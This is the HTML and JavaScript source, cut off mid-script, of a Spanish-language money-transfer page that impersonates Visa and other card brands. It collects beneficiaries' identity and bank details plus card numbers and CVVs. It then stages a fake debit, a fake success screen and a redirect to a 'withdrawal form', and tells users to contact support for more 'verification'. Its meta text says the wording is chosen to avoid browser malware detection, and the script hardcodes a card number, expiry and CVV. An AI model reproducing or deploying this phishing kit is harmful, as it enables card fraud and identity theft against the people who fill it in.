<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>VISA REMEEX Premium - Transferencias Internacionales Seguras | TallyBank</title>
  
  <!-- FAVICON -->
  <link 
    rel="icon" 
    href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" 
    type="image/png"
  />

  <!-- META VIEWPORT -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- DESCRIPCIÓN COMPLETA -->
  <meta 
    name="description" 
    content="Remeex Visa envíos instantáneos, algo muy discreto para que el navegador no lo considere malicioso. Realiza transferencias internacionales de alto valor con la seguridad y respaldo de VISA. Proceso verificado y protegido para envíos a Latinoamérica."
  />

  <!-- Fuente Plus Jakarta Sans -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link 
    href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap"
    rel="stylesheet"
  />

  <!-- Librerías de QR y PDF -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.3/html2pdf.bundle.min.js"></script>

  <style>
    :root {
      --primary: #1434CB;
      --secondary: #142C8E;
      --accent: #00A3FF;
      --success: #00875A;
      --warning: #FF9800;
      --error: #DC2626;

      --gray-50: #F8FAFC;
      --gray-100: #F1F5F9;
      --gray-200: #E2E8F0;
      --gray-300: #CBD5E1;
      --gray-400: #94A3B8;
      --gray-500: #64748B;
      --gray-600: #475569;
      --gray-700: #334155;
      --gray-800: #1E293B;
      --gray-900: #0F172A;

      --surface: #FFFFFF;
      --border-radius: 12px;
      --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.1);
    }

    * {
      margin: 0; 
      padding: 0;
      box-sizing: border-box;
      font-family: 'Plus Jakarta Sans', sans-serif;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #F6F8FE, #FFFFFF);
      color: var(--gray-800);
      line-height: 1.6;
    }

    .container {
      max-width: 1140px;
      margin: 2rem auto;
      padding: 0 1rem;
      transition: all 0.4s ease-in-out;
    }

    .card {
      background: var(--surface);
      border-radius: var(--border-radius);
      box-shadow: var(--shadow-lg);
      border: 1px solid rgba(20, 52, 203, 0.08);
      overflow: hidden;
      margin-bottom: 2rem;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    .card:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 20px rgba(0,0,0,0.12);
    }

    /* Encabezado */
    .header {
      text-align: center;
      padding: 3rem 2rem;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: #fff;
      position: relative;
      overflow: hidden;
      transition: background 0.3s ease;
    }
    .header h1 {
      font-size: 2.2rem;
      font-weight: 700;
      margin-bottom: 1rem;
      background: linear-gradient(to right, #fff, #E0E7FF);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      transition: all 0.3s ease;
    }
    .header p {
      font-size: 1.125rem;
      max-width: 800px;
      margin: 0 auto;
      line-height: 1.5;
      opacity: 0.95;
    }
    .header::before {
      content: '';
      position: absolute; 
      top: 0; 
      left: 0; 
      right: 0; 
      bottom: 0;
      background: url('data:image/svg+xml,<svg width="20" height="20" xmlns="http://www.w3.org/2000/svg"><circle cx="2" cy="2" r="2" fill="rgba(255,255,255,0.1)"/></svg>') repeat;
      opacity: 0.2;
    }

    /* Barra de Logos */
    .logo-bar {
      background: var(--surface);
      padding: 1.5rem;
      border-bottom: 1px solid var(--gray-200);
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 3rem;
      flex-wrap: wrap;
    }
    .logo-bar img {
      height: 36px;
      transition: all 0.3s ease;
      filter: grayscale(20%);
      opacity: 0.9;
    }
    .logo-bar img:hover {
      opacity: 1;
      filter: grayscale(0%);
      transform: scale(1.05);
    }

    /* Paso sections */
    .section-content {
      padding: 1.5rem;
      transition: all 0.3s ease;
    }

    /* Form */
    .form-group {
      margin-bottom: 1.5rem;
    }
    .form-label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
      color: var(--gray-700);
      font-size: 0.95rem;
    }
    .form-control {
      width: 100%;
      padding: 0.875rem 1rem;
      border: 2px solid var(--gray-200);
      border-radius: 8px;
      font-size: 1rem;
      background: var(--gray-50);
      transition: all 0.2s ease;
    }
    .form-control:hover {
      border-color: var(--gray-300);
    }
    .form-control:focus {
      outline: none;
      border-color: var(--primary);
      background: #fff;
      box-shadow: 0 0 0 4px rgba(20,52,203,0.1);
    }

    /* Botones */
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      padding: 0.875rem 1.75rem;
      border-radius: 8px;
      font-weight: 600;
      font-size: 1rem;
      transition: all 0.3s ease;
      border: none;
      cursor: pointer;
    }
    .btn-primary {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: #fff;
      box-shadow: 0 4px 12px rgba(20,52,203,0.15);
    }
    .btn-primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(20,52,203,0.25);
    }
    .btn-outline {
      background: transparent;
      color: var(--primary);
      border: 2px solid var(--primary);
    }
    .btn-outline:hover {
      background: rgba(20,52,203,0.05);
    }

    /* Barra de Progreso */
    .progress-container {
      position: relative;
      padding: 1rem 2rem;
    }
    .progress-line {
      position: absolute;
      top: 50%; 
      left: 0; 
      right: 0;
      height: 2px;
      background: var(--gray-200);
      transform: translateY(-50%);
      z-index: 0;
    }
    .progress-steps {
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: relative;
      z-index: 1;
    }
    .step-item {
      display: flex; 
      flex-direction: column; 
      align-items: center; 
      gap: 0.25rem;
    }
    .step-circle {
      width: 44px; 
      height: 44px;
      border-radius: 50%;
      background: var(--gray-100);
      border: 2px solid var(--gray-300);
      display: flex; 
      align-items: center; 
      justify-content: center;
      font-weight: 600;
      color: var(--gray-600);
      transition: transform 0.3s;
    }
    .step-circle.active {
      background: var(--primary);
      border-color: var(--primary);
      color: #fff;
      transform: scale(1.1);
    }
    .progress-fill {
      position: absolute; 
      top: 50%; 
      left: 0;
      height: 2px;
      background: var(--primary);
      transform: translateY(-50%);
      transition: width 0.4s ease;
    }

    /* Overlays */
    .overlay {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(255,255,255,0.7);
      backdrop-filter: blur(8px);
      z-index: 9999;
    }
    .overlay.active {
      display: flex;
    }
    .overlay-content {
      background: #fff;
      border-radius: 12px;
      padding: 2rem;
      max-width: 500px;
      text-align: center;
      box-shadow: 0 4px 24px rgba(0,0,0,0.1);
      transition: all 0.3s ease;
    }
    .loader {
      width: 48px; 
      height: 48px;
      border: 4px solid rgba(20,52,203,0.1);
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    /* Contador de 90s */
    #countdownTimer {
      font-size: 1.5rem;
      font-weight: 700;
      margin: 1rem 0;
      color: var(--secondary);
    }

    /* SUCCESS ANIMATION (Confeti + Flash) */
    .success-animation {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      text-align: center;
      flex-direction: column;
      background: rgba(255,255,255,0.95);
      backdrop-filter: blur(12px);
      z-index: 10000;
    }
    .success-animation.active {
      display: flex;
    }
    .confetti {
      position: absolute;
      width: 10px; 
      height: 10px;
      background: #fff;
      animation: fall 2.5s linear infinite;
      opacity: 0.8;
    }
    @keyframes fall {
      to {
        transform: translateY(800px) rotateZ(540deg);
      }
    }
    .flash {
      width: 100%;
      height: 100%;
      background: rgba(255,255,0,0.2);
      position: absolute;
      top: 0; 
      left: 0;
      animation: flashAnim 2s ease;
    }
    @keyframes flashAnim {
      0%, 100% { opacity: 0; }
      10%, 90% { opacity: 1; }
    }
    .checkmark-icon {
      width: 56px; 
      height: 56px;
      border: 4px solid var(--success);
      border-radius: 50%;
      position: relative;
      margin-bottom: 1rem;
    }
    .checkmark-icon::after {
      content: "";
      width: 14px; 
      height: 28px;
      border: solid var(--success);
      border-width: 0 4px 4px 0;
      display: block;
      position: absolute;
      top: 6px; 
      left: 17px;
      transform: rotate(45deg);
    }

    /* Portal Resumen (Paso 6) */
    #portalContainer {
      display: none;
    }
    .portal-header {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: #fff;
      padding: 3rem 2rem;
      border-radius: var(--border-radius) var(--border-radius) 0 0;
      text-align: center;
      position: relative;
      transition: all 0.3s ease;
    }
    .portal-header h2 {
      font-size: 2rem;
      font-weight: 700;
      margin-bottom: 1rem;
      position: relative;
    }
    .portal-alert {
      background: rgba(255,152,0,0.1);
      border: 1px solid rgba(255,152,0,0.2);
      color: #B45309;
      border-radius: 8px;
      padding: 1rem;
      margin: 1rem 0;
      text-align: center;
      font-size: 0.95rem;
      line-height: 1.4;
    }
    .balances {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px,1fr));
      gap: 1rem;
      margin-bottom: 2rem;
    }
    .balance-card {
      background: #fff;
      border-radius: 8px;
      border: 1px solid var(--gray-200);
      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
      text-align: center;
      padding: 1rem;
      transition: all 0.3s ease;
    }
    .balance-card:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 16px rgba(0,0,0,0.08);
    }
    .balance-card h3 {
      font-size: 1rem;
      margin-bottom: 0.25rem;
      color: var(--gray-700);
      display: flex; 
      align-items:center; 
      justify-content:center;
      gap: 0.5rem;
    }
    .balance-card p {
      font-size: 1.4rem;
      font-weight: 700;
      margin: 0;
      color: var(--gray-900);
    }
    .transaction-details {
      background: var(--gray-50);
      border-radius: 8px;
      padding: 1rem;
      margin-top: 1rem;
      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
    }
    .transaction-details h3 {
      font-size: 1.25rem;
      font-weight: 700;
      margin-bottom: 1rem;
    }
    .transaction-info {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px,1fr));
      gap: 1rem;
    }
    .info-item {
      background: #fff;
      border: 1px solid var(--gray-200);
      border-radius: 8px;
      padding: 0.75rem;
      font-size: 0.9rem;
      color: var(--gray-700);
    }
    .info-item strong {
      display: block;
      margin-bottom: 0.25rem;
      color: var(--gray-900);
    }
    .qr-section {
      text-align: center;
      margin-top: 1rem;
    }
    .qr-caption {
      font-size: 0.8rem;
      color: var(--gray-600);
      margin-top: 0.5rem;
    }
    .portal-buttons {
      display: flex;
      gap: 1rem;
      flex-wrap: wrap;
      justify-content: center;
      margin-top: 1.5rem;
    }

    /* Adaptación para dispositivos móviles (16:9) */
    @media (max-width:768px) {
      .header h1 { 
        font-size:1.8rem; 
      }
      .portal-header h2 {
        font-size:1.6rem;
      }
      .container {
        margin: 1rem auto;
        padding: 0 0.5rem;
      }
    }

    /* Pantallas 16:9 de móviles en landscape */
    @media only screen and (max-device-height: 480px) and (orientation: landscape) {
      body {
        padding: 1rem;
      }
      .header {
        padding: 2rem 1rem;
      }
      .portal-header {
        padding: 2rem 1rem;
      }
    }
  </style>
</head>

<body>

<!-- Overlays -->
<!-- Validación Beneficiario (P3) -->
<div class="overlay" id="accountCheckOverlay">
  <div class="overlay-content">
    <h3>Validando Cuenta Bancaria...</h3>
    <p style="font-size:0.9rem; margin:1rem 0;">
      Por favor, espera mientras comprobamos la compatibilidad con VISA.
    </p>
    <div class="loader"></div>
  </div>
</div>

<!-- Cuenta apta -->
<div class="overlay" id="accountValidOverlay">
  <div class="overlay-content">
    <h3 style="margin-bottom:1rem; color:var(--primary)">Cuenta Apta para VISA</h3>
    <p id="confirmBenefData" style="font-size:0.9rem; color:var(--gray-700); margin-bottom:1rem;">
      <!-- Se llena con JS -->
    </p>
    <label style="display:block; text-align:left; margin-bottom:1rem;">
      <input type="checkbox" id="checkVisaApta" style="margin-right:0.5rem;">
      Confirmo que esta cuenta puede recibir transferencias VISA
    </label>
    <p style="font-size:0.85rem; margin-bottom:1.5rem; line-height:1.4;">
      Si tu transferencia llega a 5 o 6 cifras, requerimos una verificación de seguridad
      adicional al finalizar el proceso.
    </p>
    <div style="display:flex; gap:1rem; justify-content:center;">
      <button class="btn btn-outline" onclick="closeAccountValidOverlay()">Cancelar</button>
      <button class="btn btn-primary" onclick="proceedAfterAccountValid()">Aceptar y Continuar</button>
    </div>
  </div>
</div>

<!-- Procesando Pago (P5) -->
<div class="overlay" id="processingPaymentOverlay">
  <div class="overlay-content">
    <h3 style="margin-bottom:1rem; color:var(--primary)">Procesando Pago</h3>
    <p style="font-size:0.9rem; margin-bottom:1.5rem;">
      Por favor, espera mientras realizamos la solicitud de débito.
    </p>
    <div class="loader"></div>
  </div>
</div>

<!-- Countdown 90s -->
<div class="overlay" id="countdownOverlay">
  <div class="overlay-content">
    <h3 style="margin-bottom:1rem; color:var(--secondary)">Aprobación de la Tarjeta</h3>
    <p style="font-size:0.9rem; margin-bottom:1rem;">
      El titular de la tarjeta debe aprobar el débito en su aplicación bancaria.
    </p>
    <div id="countdownTimer">90s</div>
    <p style="font-size:0.85rem; color:var(--gray-600); margin-bottom:1rem;">
      Esperando confirmación de fondos...
    </p>
    <div class="loader" style="border:4px solid rgba(0,0,0,0.1); border-top-color:var(--secondary);"></div>
  </div>
</div>

<!-- Monto Debitado con Éxito -->
<div class="overlay" id="fundsDebitedOverlay">
  <div class="overlay-content">
    <h3 style="margin-bottom:1rem; color:var(--primary)">Monto Debitado con Éxito</h3>
    <p id="fundsDebitedText" style="font-size:0.9rem; margin-bottom:1rem;">
      <!-- Se llena con JS -->
    </p>
    <p id="benefSecurityMsg" style="font-size:0.85rem; margin-bottom:1.5rem; line-height:1.4;">
      <!-- Se llena con JS (texto personalizado) -->
    </p>
    <div style="display:flex; gap:1rem; justify-content:center;">
      <button class="btn btn-primary" onclick="approveFunds()">Aceptar</button>
    </div>
  </div>
</div>

<!-- Éxito final -->
<div class="overlay success-animation" id="successAnimation">
  <!-- Confeti -->
  <div class="confetti" style="left:15%; animation-delay:0.1s;"></div>
  <div class="confetti" style="left:30%; animation-delay:0.3s;"></div>
  <div class="confetti" style="left:50%; animation-delay:0.5s;"></div>
  <div class="confetti" style="left:70%; animation-delay:0.7s;"></div>
  <div class="confetti" style="left:85%; animation-delay:0.9s;"></div>

  <div class="flash"></div>

  <div style="position:relative; z-index:1; display:flex; flex-direction:column; align-items:center; gap:1rem;">
    <div class="checkmark-icon"></div>
    <h2 style="font-size:1.4rem;">¡Operación Exitosa!</h2>
    <p id="finalSuccessText" style="font-size:0.9rem; max-width:300px; color:var(--gray-700); text-align:center;">
      <!-- Se llena con JS (monto y bolívares) -->
    </p>
  </div>
</div>

<!-- NUEVO OVERLAY: Mostrar Nº de Comprobante / Countdown en el botón -->
<div class="overlay" id="operationNumberOverlay">
  <div class="overlay-content">
    <h3 style="margin-bottom:1rem; color:var(--primary)">Número de Comprobante</h3>
    <p style="font-size:0.9rem; margin-bottom:1.5rem; line-height:1.4;">
      Tu número de Comprobante generado es: <br>
      <strong id="operationNumberDisplay"></strong><br><br>
      Se recomienda guardar este número para solicitar el depósito en tu cuenta bancaria.
      Por favor, toma una captura de pantalla.
    </p>

    <!-- Botón deshabilitado con cuenta regresiva -->
    <button 
      class="btn btn-primary" 
      id="continuePlanillaBtn" 
      disabled
      onclick="window.open('https://planilla.remeexvisa.com/','_self')"
    >
      Continuar a la planilla de retiro de fondos (20s)
    </button>
  </div>
</div>
<!-- Fin Nuevo Overlay -->

<!-- Steps 1..5 -->
<div class="container card" id="stepsContainer">
  <!-- HEADER -->
  <div class="header">
    <h1>VISA REMEEX Premium</h1>
    <p>
      Gracias a la tecnología VISA, puedes enviar dinero 
      de forma instantánea a una cuenta bancaria sin comisiones, 
      con la mejor tasa de cambio y con la rapidez que necesitas.
    </p>
  </div>

  <!-- LOGO BAR -->
  <div class="logo-bar">
    <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
    <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
    <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
  </div>

  <!-- Progress -->
  <div class="progress-container">
    <div class="progress-line"></div>
    <div class="progress-steps">
      <div class="step-item">
        <div class="step-circle" id="stepCircle1">1</div>
        <div style="font-size:0.8rem; color:var(--gray-600);">Idioma</div>
      </div>
      <div class="step-item">
        <div class="step-circle" id="stepCircle2">2</div>
        <div style="font-size:0.8rem; color:var(--gray-600);">País</div>
      </div>
      <div class="step-item">
        <div class="step-circle" id="stepCircle3">3</div>
        <div style="font-size:0.8rem; color:var(--gray-600);">Benef.</div>
      </div>
      <div class="step-item">
        <div class="step-circle" id="stepCircle4">4</div>
        <div style="font-size:0.8rem; color:var(--gray-600);">Método</div>
      </div>
      <div class="step-item">
        <div class="step-circle" id="stepCircle5">5</div>
        <div style="font-size:0.8rem; color:var(--gray-600);">Pago</div>
      </div>
      <div class="progress-fill" id="progressFill" style="width:0%;"></div>
    </div>
  </div>

  <!-- Paso 1 -->
  <div class="section-content" id="section1">
    <div class="form-group">
      <label class="form-label" for="language">Seleccione Idioma</label>
      <select class="form-control" id="language">
        <option value="">-- Elige un idioma --</option>
        <option value="es">Español</option>
        <option value="en">English</option>
        <option value="fr">Français</option>
        <option value="de">Deutsch</option>
        <option value="pt">Português</option>
        <option value="zh">中文</option>
      </select>
    </div>
    <div class="form-group">
      <input type="checkbox" id="acceptVisa"/>
      <label for="acceptVisa" style="margin-left:0.25rem;">
        Acepto los 
        <a href="https://www.visa.es/terminos-de-uso.html" target="_blank">
          Términos y Condiciones de Visa
        </a>
      </label>
    </div>
    <div style="margin-top:1rem;">
      <iframe 
        width="100%"
        height="315"
        src="https://www.youtube.com/embed/Cs0h74fI3m8"
        title="Video Explicativo"
        frameborder="0"
        allowfullscreen>
      </iframe>
    </div>
    <div style="display:flex; justify-content:flex-end; margin-top:1rem;">
      <button class="btn btn-primary" onclick="goNext()">Continuar</button>
    </div>
  </div>

  <!-- Paso 2 -->
  <div class="section-content" id="section2" style="display:none;">
    <div class="form-group">
      <label class="form-label" for="country">Seleccione el País Destino</label>
      <select class="form-control" id="country">
        <option value="">-- Seleccione --</option>
        <option value="Venezuela">Venezuela</option>
        <option value="Colombia">Colombia</option>
        <option value="México">México</option>
        <option value="Argentina">Argentina</option>
        <option value="Chile">Chile</option>
        <option value="Perú">Perú</option>
        <option value="Brasil">Brasil</option>
        <option value="Ecuador">Ecuador</option>
        <option value="Panamá">Panamá</option>
        <option value="República Dominicana">República Dominicana</option>
        <option value="Costa Rica">Costa Rica</option>
        <option value="Uruguay">Uruguay</option>
      </select>
    </div>
    <div style="display:flex; justify-content:space-between; margin-top:1rem;">
      <button class="btn btn-outline" onclick="goBack()">Regresar</button>
      <button class="btn btn-primary" onclick="goNext()">Continuar</button>
    </div>
  </div>

  <!-- Paso 3 -->
  <div class="section-content" id="section3" style="display:none;">
    <div id="vzAlert" style="display:none; margin-bottom:1rem;">
      <!-- Alerta VE -->
      <p style="background: rgba(20,52,203,0.05); border:1px solid rgba(20,52,203,0.1); padding:1rem; border-radius:8px;">
        <strong>País Seleccionado: Venezuela.</strong> Moneda local: Bolívar (VES).
      </p>
    </div>
    <div class="form-group">
      <label class="form-label" for="beneficiaryName">Nombre Completo (solo letras)</label>
      <input class="form-control" type="text" id="beneficiaryName" placeholder="Ej: Juan Pérez">
    </div>
    <div class="form-group">
      <label class="form-label" for="beneficiaryID">Cédula de Identidad (solo números)</label>
      <input class="form-control" type="text" id="beneficiaryID" placeholder="Ej: 12345678">
    </div>
    <div class="form-group">
      <label class="form-label" for="beneficiaryPhone">Teléfono (solo números)</label>
      <input class="form-control" type="text" id="beneficiaryPhone" placeholder="Ej: 04140000000">
    </div>
    <div class="form-group">
      <label class="form-label" for="beneficiaryEmail">Correo Electrónico</label>
      <input class="form-control" type="email" id="beneficiaryEmail" placeholder="usuario@dominio.com">
    </div>
    <div class="form-group">
      <label class="form-label" for="beneficiaryAccount">Número de Cuenta (20 dígitos)</label>
      <input class="form-control" type="text" id="beneficiaryAccount" placeholder="Ej: 01021234567890123456">
    </div>
    <p style="background:rgba(255,152,0,0.1); border:1px solid rgba(255,152,0,0.2); padding:1rem; border-radius:8px; font-size:0.9rem;">
      Si el monto es alto, asegúrese de ingresar datos correctos para evitar retrasos.
    </p>

    <div style="display:flex; justify-content:space-between; margin-top:1rem;">
      <button class="btn btn-outline" onclick="goBack()">Regresar</button>
      <button class="btn btn-primary" onclick="validateBeneficiary()">Continuar</button>
    </div>
  </div>

  <!-- Paso 4 -->
  <div class="section-content" id="section4" style="display:none;">
    <div class="form-group">
      <label class="form-label" for="paymentMethod">Método de Recarga</label>
      <select class="form-control" id="paymentMethod">
        <option value="">-- Seleccione --</option>
        <option value="credit">Tarjeta de Crédito</option>
        <option value="debit">Tarjeta de Débito</option>
      </select>
    </div>
    <div style="display:flex; justify-content:space-between; margin-top:1rem;">
      <button class="btn btn-outline" onclick="goBack()">Regresar</button>
      <button class="btn btn-primary" onclick="goNext()">Continuar</button>
    </div>
  </div>

  <!-- Paso 5 -->
  <div class="section-content" id="section5" style="display:none;">
    <div class="form-group">
      <label class="form-label" for="cardName">Nombre del Titular</label>
      <input class="form-control" type="text" id="cardName" placeholder="Ej: John Doe">
    </div>
    <div class="form-group">
      <label class="form-label" for="cardNumber">Número de Tarjeta</label>
      <input class="form-control" type="text" id="cardNumber" placeholder="Ej: 4000000000000000">
    </div>
    <div class="form-group">
      <label class="form-label" for="expDate">Fecha de Expiración (MM/YY)</label>
      <input class="form-control" type="text" id="expDate" placeholder="MM/YY">
    </div>
    <div class="form-group">
      <label class="form-label" for="cvv">CVV</label>
      <input class="form-control" type="text" id="cvv" placeholder="3 dígitos">
    </div>
    <div class="form-group">
      <label class="form-label" for="amount">Seleccione Monto (USD)</label>
      <select class="form-control" id="amount">
        <option value="">-- Seleccione --</option>
        <option value="500">$500 USD</option>
        <option value="1000">$1000 USD</option>
        <option value="1500">$1500 USD</option>
        <option value="2000">$2000 USD</option>
      </select>
    </div>
    <div style="display:flex; justify-content:space-between; margin-top:1rem;">
      <button class="btn btn-outline" onclick="goBack()">Regresar</button>
      <button class="btn btn-primary" onclick="processPayment()">Procesar</button>
    </div>
  </div>
</div>

<!-- Portal (Paso 6) -->
<div class="container card" id="portalContainer">
  <div class="portal-header">
    <h2>Resumen de Operación</h2>
    <p style="margin-bottom:0.5rem;">
      Tus fondos han sido debitados y esperan tu acción para aceptarlos en tu cuenta.
    </p>
  </div>
  <div style="padding:1.5rem;">
    <div class="portal-alert">
      Para autorizar el depósito en tu banco destino, por favor comunícate con atención al cliente
      y completa el proceso de verificación.
    </div>

    <div class="balances">
      <div class="balance-card">
        <h3><img src="https://flagcdn.com/w20/us.png" alt="USD" /> USD</h3>
        <p id="portalUSDAmount">$0.00</p>
      </div>
      <div class="balance-card">
        <h3><img src="https://flagcdn.com/w20/eu.png" alt="EUR" /> EUR</h3>
        <p>€0.00</p>
      </div>
      <div class="balance-card">
        <h3><img src="https://flagcdn.com/w20/ve.png" alt="VES" /> VES</h3>
        <p id="portalVESAmount">Bs. 0.00</p>
      </div>
    </div>

    <div class="transaction-details">
      <h3>Detalles de la Operación</h3>
      <div class="transaction-info">
        <div class="info-item">
          <strong>Beneficiario:</strong>
          <span id="portalName">N/A</span>
        </div>
        <div class="info-item">
          <strong>Cédula:</strong>
          <span id="portalID">N/A</span>
        </div>
        <div class="info-item">
          <strong>Teléfono:</strong>
          <span id="portalPhone">N/A</span>
        </div>
        <div class="info-item">
          <strong>Email:</strong>
          <span id="portalEmail">N/A</span>
        </div>
        <div class="info-item">
          <strong>País Destino:</strong>
          <span id="portalCountry">N/A</span>
        </div>
        <div class="info-item">
          <strong>Banco:</strong>
          <span id="portalBank">N/A</span>
        </div>
        <div class="info-item">
          <strong>Nº de Cuenta:</strong>
          <span id="portalAccount">N/A</span>
        </div>
        <div class="info-item">
          <strong>Monto USD:</strong>
          <span id="portalAmount">N/A</span>
        </div>
        <div class="info-item">
          <strong>Tarjeta Usada:</strong>
          <span id="portalCard">N/A</span>
        </div>
        <!-- Nº de Comprobante -->
        <div class="info-item">
          <strong>Nº de Comprobante:</strong>
          <span id="portalOperationNumber">N/A</span>
        </div>
      </div>
      <div class="qr-section">
        <div id="qrcode"></div>
        <p class="qr-caption">Escanea para validar con <strong>Visa</strong></p>
      </div>
    </div>

    <div class="portal-buttons">
      <button class="btn btn-primary" onclick="requestDeposit()">
        Solicitar Depósito en mi Cuenta
      </button>
      <button class="btn btn-outline" onclick="downloadPDF()">
        Descargar Comprobante (PDF)
      </button>
    </div>
  </div>
</div>

<script>
  /* ===========================
     GLOBALES
  ===========================*/
  const globalData = {
    language: "",
    country: "",
    beneficiary: { name: "", id: "", phone: "", email: "", account: "" },
    paymentMethod: "",
    card: { name: "", number: "", expDate: "", cvv: "" },
    amount: "",
    exchangeRate: 69
  };

  // Banco codes
  const bankCodes = {
    "0001": "Banco Central de Venezuela","0102":"Banco de Venezuela","0104":"Banco Venezolano de Crédito","0105":"Banco Mercantil","0108":"Banco Provincial","0114":"Bancaribe","0115":"Banco Exterior","0128":"Banco Caroní","0134":"Banesco","0137":"Banco Sofitasa","0138":"Banco Plaza","0146":"Banco de la Gente Emprendedora","0151":"Banco Fondo Común","0156":"100% Banco","0157":"DelSur","0163":"Banco del Tesoro","0166":"Banco Agrícola de Venezuela","0168":"Bancrecer","0169":"Mi Banco","0171":"Banco Activo","0172":"Bancamiga","0173":"Banco Internacional de Desarrollo","0174":"Banplus","0175":"Banco Bicentenario","0177":"Banco de la Fuerza Armada Nacional Bolivariana","0191":"Banco Nacional de Crédito","0601":"Instituto Municipal de Crédito Popular"
  };

  // Tarjeta única (ejemplo)
  const validCardNumber = "4745034211763009";
  const validExpDate = "01/26";
  const validCVV = "583";

  let currentStep = 1;
  let countdownInterval = null;

  // ========== MOSTRAR SECCION ==========
  function showSection(num) {
    for (let i = 1; i <= 5; i++) {
      const sec = document.getElementById("section" + i);
      if (sec) {
        if (i === num) {
          sec.style.display = "block";
        } else {
          sec.style.display = "none";
          resetFields(i); // Limpia la info si regresamos
        }
      }
    }
    document.getElementById("portalContainer").style.display = "none";
    currentStep = num;
    updateProgressBar();
    if (num === 3) {
      if (globalData.country === "Venezuela") {
        document.getElementById("vzAlert").style.display = "block";
      } else {
        document.getElementById("vzAlert").style.display = "none";
      }
    }
  }

  // Limpiar campos en seccion si se regresa
  function resetFields(step) {
    if (step === currentStep) return; 
    const sec = document.getElementById("section" + step);
    if (!sec) return;
    const inputs = sec.querySelectorAll("input, select");
    inputs.forEach(el => {
      if (el.type === "checkbox") {
        el.checked = false;
      } else {
        el.value = "";
      }
    });
  }

  function updateProgressBar(){
    for (let i = 1; i <= 5; i++) {
      const circle = document.getElementById("stepCircle" + i);
      if (i <= currentStep) {
        circle.classList.add("active");
      } else {
        circle.classList.remove("active");
      }
    }
    document.getElementById("progressFill").style.width = (currentStep - 1) * 25 + "%";
  }

  function goNext(){
    if (currentStep === 1) {
      const lang = document.getElementById("language").value;
      const acc = document.getElementById("acceptVisa").checked;
      if (!lang) { 
        alert("Seleccione un idioma.");
        return; 
      }
      if (!acc) { 
        alert("Debe aceptar los Términos de Visa.");
        return; 
      }
      globalData.language = lang;
    }
    if (currentStep === 2) {
      const c = document.getElementById("country").value;
      if (!c) { 
        alert("Seleccione un país destino.");
        return;
      }
      globalData.country = c;
    }
    if (currentStep === 4) {
      const pm = document.getElementById("paymentMethod").value;
      if (!pm) { 
        alert("Seleccione un método de recarga.");
        return;
      }
      globalData.paymentMethod = pm;
    }
    if (currentStep < 5) {
      showSection(currentStep + 1);
    }
  }

  function goBack(){
    if (currentStep > 1) {
      showSection(currentStep - 1);
    }
  }

  // ========== VALIDAR BENEFICIARIO (P3) ==========
  function validateBeneficiary(){
    const name = document.getElementById("beneficiaryName").value.trim();
    const id = document.getElementById("beneficiaryID").value.trim();
    const phone = document.getElementById("beneficiaryPhone").value.trim();
    const email = document.getElementById("beneficiaryEmail").value.trim();
    const acc = document.getElementById("beneficiaryAccount").value.trim();

    if (!name || !id || !phone || !email || !acc) {
      alert("Complete todos los campos del beneficiario.");
      return;
    }
    if(!/^[a-zA-Z\sáéíóúÁÉÍÓÚñÑ]+$/.test(name)){
      alert("El campo Nombre solo debe contener letras.");
      return;
    }
    if (!/^\d+$/.test(id)) {
      alert("La Cédula debe contener solo números.");
      return;
    }
    if (!/^\d+$/.test(phone)) {
      alert("El Teléfono debe contener solo números.");
      return;
    }
    if (acc.length !== 20 || !/^\d+$/.test(acc)) {
      alert("El número de cuenta debe ser de 20 dígitos.");
      return;
    }

    globalData.beneficiary.name = name;
    globalData.beneficiary.id = id;
    globalData.beneficiary.phone = phone;
    globalData.beneficiary.email = email;
    globalData.beneficiary.account = acc;

    document.getElementById("accountCheckOverlay").classList.add("active");
    setTimeout(()=>{
      document.getElementById("accountCheckOverlay").classList.remove("active");
      fillBenefConfirm();
      document.getElementById("accountValidOverlay").classList.add("active");
    }, 2000);
  }

  function fillBenefConfirm(){
    const {name,id,phone,email,account} = globalData.beneficiary;
    const code = account.slice(0,4);
    const deducedBank = bankCodes[code] || "Banco Desconocido";
    const text = `
      <strong>Datos del Beneficiario:</strong><br>
      Nombre: ${name}<br>
      Cédula: ${id}<br>
      Teléfono: ${phone}<br>
      Email: ${email}<br>
      Banco: ${deducedBank}<br>
      Nº Cuenta: ${account}
    `;
